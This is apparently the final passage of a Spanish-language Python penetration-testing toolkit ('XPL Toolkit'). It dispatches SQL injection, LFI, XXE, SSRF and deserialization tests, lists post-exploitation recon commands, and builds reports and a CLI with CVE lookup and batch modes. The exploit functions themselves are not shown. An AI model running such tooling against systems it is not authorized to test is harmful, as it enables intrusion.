                exploit_output = test_sqli(target, session_dir) or ""
            elif extra_choice == "2":
                test_lfi(target, session_dir)
            elif extra_choice == "3":
                test_xxe(target, session_dir)
            elif extra_choice == "4":
                test_ssrf(target, session_dir)
            elif extra_choice == "5":
                test_deserialization(target, session_dir)

    # ── Post-Explotación ──
    if auth_mode == "full" and exploit_output:
        step_info(8, "Post-Explotación")
        info("Si hay shell activo, ejecuta: whoami, id, ip a, hostname, uname -a")
        log_to_session(session_dir, "Post-exploitation", "Comandos listados")

    # ── Reporte ──
    html, md = generate_report(
        target=target, vulnerability=vuln, session_dir=session_dir,
        status="SUCCESS" if exploit_output else ("VERIFY" if auth_mode == "verify" else "INFO"),
        cve_results=cve_results, services=services,
        waf=waf, tls_info=tls_info,
        raw_output=exploit_output[:3000] if exploit_output else nmap_out[:3000],
        auth_mode=auth_mode, tools_used=", ".join(available[:5])
    )

    # ── Resumen ──
    section("RESUMEN FINAL")
    stats = {
        "Target": target,
        "Prueba": vuln,
        "Modo": auth_mode,
        "Servicios": str(len(services)),
        "CVEs": str(len(cve_results)),
        "WAF": "Sí" if waf else "No",
        "TLS": ", ".join(tls_info.get("supported", [])) if tls_info else "N/A",
        "Sesión": session_dir,
        "Reporte HTML": html,
        "Reporte MD": md,
    }
    for k, v in stats.items():
        print(f"  {cc(k+':', Colors.BOLD)} {v}")
    print()

    log_audit("SESSION_COMPLETE", target, f"Status={stats['Modo']}, CVEs={stats['CVEs']}")
    logger.info("Session completed successfully")


# =============================================================================
#  CLI PRINCIPAL
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f"XPL Toolkit v{VERSION} — Advanced Vulnerability Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Ejemplos interactivos:
  python3 xpl_toolkit_v2.py 192.168.1.10 smb
  python3 xpl_toolkit_v2.py example.com web-recon
  python3 xpl_toolkit_v2.py

Solo CVE Lookup (con caché y API Key):
  python3 xpl_toolkit_v2.py --cve-only "apache httpd 2.4" --min-severity HIGH
  python3 xpl_toolkit_v2.py --cve-only "log4j" --output json --out cves.json

Modo batch (sin interacción):
  python3 xpl_toolkit_v2.py --batch 192.168.1.10 smb --batch-auth verify
  python3 xpl_toolkit_v2.py --batch example.com web-recon --batch-auth full

Verificar herramientas:
  python3 xpl_toolkit_v2.py --check-tools

Descargar SecLists:
  python3 xpl_toolkit_v2.py --download-seclists

Caché:
  python3 xpl_toolkit_v2.py --cache-stats
        """
    )
    parser.add_argument("target", nargs="?", help="Objetivo (IP o dominio)")
    parser.add_argument("vulnerability", nargs="?", help="Vulnerabilidad o servicio")

    # CVE-only
    parser.add_argument("--cve-only", help="Solo búsqueda CVE")
    parser.add_argument("--min-severity", choices=["LOW", "MEDIUM", "HIGH", "CRITICAL"],
                        help="Filtrar CVEs por severidad mínima")
    parser.add_argument("--output", choices=["table", "json", "csv"], default="table",
                        help="Formato de salida CVE")
    parser.add_argument("--out", help="Archivo de salida CVE")

    # Batch
    parser.add_argument("--batch", action="store_true", help="Modo batch (no interactivo)")
    parser.add_argument("--batch-auth", choices=["full", "verify", "cancel"], default="verify",
                        help="Autorización para modo batch (default: verify)")

    # Utilidades
    parser.add_argument("--check-tools", action="store_true", help="Verificar e instalar herramientas")
    parser.add_argument("--download-seclists", action="store_true", help="Descargar wordlists de SecLists")
    parser.add_argument("--cache-stats", action="store_true", help="Estadísticas de caché CVE")

    args = parser.parse_args()

    # Crear dirs
    os.makedirs(CACHE_DIR, exist_ok=True)
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    os.makedirs(WORDLISTS_DIR, exist_ok=True)

    if args.cve_only:
        banner()
        section("CVE Lookup — Modo Exclusivo")
        results = fetch_cves_cached(args.cve_only, limit=50, min_severity=args.min_severity)
        if args.output == "table":
            print_cve_table(results)
        elif args.output in ("json", "csv") and args.out:
            export_cve_results(results, args.output, args.out)
        else:
            print_cve_table(results)
    elif args.check_tools:
        banner()
        check_and_install_tools()
    elif args.download_seclists:
        banner()
        download_sec_lists()
    elif args.cache_stats:
        banner()
        cache = CVECache()
        stats = cache.stats()
        cache.close()
        section("Estadísticas de Caché")
        print(f"  Entradas totales: {stats['total_entries']}")
        print(f"  Queries únicas:   {stats['unique_queries']}")
    elif args.batch:
        if not args.target:
            error("Modo batch requiere un objetivo posicional: --batch <IP-o-dominio> [servicio]")
            sys.exit(1)
        batch_mode(args)
    elif args.target:
        interactive_mode(args)
    else:
        args.target = None
        args.vulnerability = None
        interactive_mode(args)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda *_: (print(f"\n{cc('[ABORT]', Colors.RED)} Saliendo..."), sys.exit(0)))
    main()
